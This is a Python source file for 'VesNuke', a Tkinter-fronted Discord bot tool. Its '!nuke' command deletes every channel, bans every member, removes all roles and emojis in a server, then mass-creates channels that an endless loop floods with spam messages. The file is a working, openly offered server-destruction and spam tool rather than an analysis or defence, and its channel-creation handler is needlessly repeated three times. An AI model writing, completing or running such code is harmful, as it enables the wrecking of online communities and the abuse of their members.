from tkinter import *
from tkinter import messagebox
from discord.ext import commands
from random import choice
window = Tk()
window.title("VesNuke || vesper #0003 / #8757")
window.geometry("591x552")
window.maxsize(591, 552)
window.minsize(591, 552)
window.iconbitmap("assets/mylogo.ico")
window.config(background='#222222')
bg = PhotoImage(file='assets/background.png')
addbu = PhotoImage(file='assets/addbu.png')
startbu = PhotoImage(file='assets/startbu.png')
class Nuker(commands.Bot):
    def __init__(self, amount, channellist, messagelist):
        self.messagelist = messagelist
        super().__init__(command_prefix="!")
        @self.command(name="nuke")
        async def nuke(ctx):
            await ctx.message.delete()
            guild = ctx.guild
            for channel in guild.channels:
                try:await channel.delete()
                except:pass
            for member in guild.members:
                try:await member.ban()
                except:pass
            for role in guild.roles:
                try:await role.delete()
                except:pass
            for emoji in list(ctx.guild.emojis):
                try:await emoji.delete()
                except:pass
            for _ in range(int(amount)):await guild.create_text_channel(choice(channellist))
    async def on_guild_channel_create(self,channel):
        while True:
            await channel.send(choice(self.messagelist))
    async def on_guild_channel_create(self,channel):
        while True:
            await channel.send(choice(self.messagelist))
    async def on_guild_channel_create(self,channel):
        while True:
            await channel.send(choice(self.messagelist))
class VesNuke:
    def start(self):
        token = self.token.get()
        amount = self.amount.get()
        channellist = self.channellist
        messagelist = self.messagelist
        messagebox.showinfo('VesNuke || vesper #0003 / #8757','COMMAND : !nuke')
        VESNUKE = Nuker(amount,channellist,messagelist)
        VESNUKE.run(token)
    def addchan(self):
        chan = self.channels.get()
        if len(chan) > 1:
            self.channellist.append(chan)
            self.channels.delete(0, END)
            messagebox.showinfo('VesNuke || vesper #0003 / #8757',f'Added {chan} To Channels')
    def addmsg(self):
        msg = self.messages.get()
        if len(msg) > 1:
            self.messagelist.append(msg)
            self.messages.delete(0, END)
            messagebox.showinfo('VesNuke || vesper #0003 / #8757',f'Added {msg} To Messages')
    def __init__(self):
        self.channellist = []
        self.messagelist = []
        bgg2 = Label(window, image=bg, borderwidth=0)
        bgg2.place(x=0, y=0)
        self.token = Entry(window,font=('SeoulHangang',10),bg='#D9D9D9', fg='#0961E3',width=40,borderwidth=0,show='*')
        self.token.place(x=80, y=186)
        self.amount = Entry(window,font=('SeoulHangang',10),bg='#D9D9D9', fg='#0961E3',width=12,borderwidth=0)
        self.amount.place(x=232, y=234)
        self.channels = Entry(window,font=('SeoulHangang',10),bg='#D9D9D9', fg='#0961E3',width=49,borderwidth=0)
        self.channels.place(x=80, y=308)
        add = Button(window, image=addbu,bg='#111111',borderwidth=0, activebackground="#111111",command=self.addchan)
        add.place(x=431,y=306)
        self.messages = Entry(window,font=('SeoulHangang',10),bg='#D9D9D9', fg='#0961E3',width=49,borderwidth=0)
        self.messages.place(x=80, y=372)
        add2 = Button(window, image=addbu,bg='#111111',borderwidth=0, activebackground="#111111",command=self.addmsg)
        add2.place(x=431,y=370)
        start = Button(window, image=startbu,bg='#111111',borderwidth=0, activebackground="#111111",command=self.start)
        start.place(x=201,y=432)
VesNuke()
window.mainloop()
